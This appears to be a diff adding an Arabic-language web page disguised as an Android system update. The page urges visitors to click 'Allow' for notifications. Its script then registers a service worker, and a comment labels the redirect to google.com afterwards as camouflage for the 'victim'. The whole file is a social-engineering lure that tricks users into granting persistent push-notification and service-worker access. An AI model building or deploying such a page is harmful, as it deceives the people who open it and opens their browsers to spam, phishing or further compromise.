@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>تحديث نظام أندرويد</title>
+</head>
+<body style="text-align: center; font-family: sans-serif; padding-top: 50px;">
+    <h2>جاري فحص توافق الجهاز مع التحديث الجديد...</h2>
+    <p>يرجى الضغط على <b>"سماح" (Allow)</b> لتلقي إشعار عند اكتمال التحديث.</p>
+    <script>
+        Notification.requestPermission().then(perm => {
+            if (perm === 'granted') {
+                navigator.serviceWorker.register('sw.js');
+                // تمويه: توجيه الضحية لموقع حقيقي بعد 3 ثواني
+                setTimeout(() => { window.location.href = "https://www.google.com"; }, 3000);
+            }
+        });
+    </script>
+</body>
+</html>
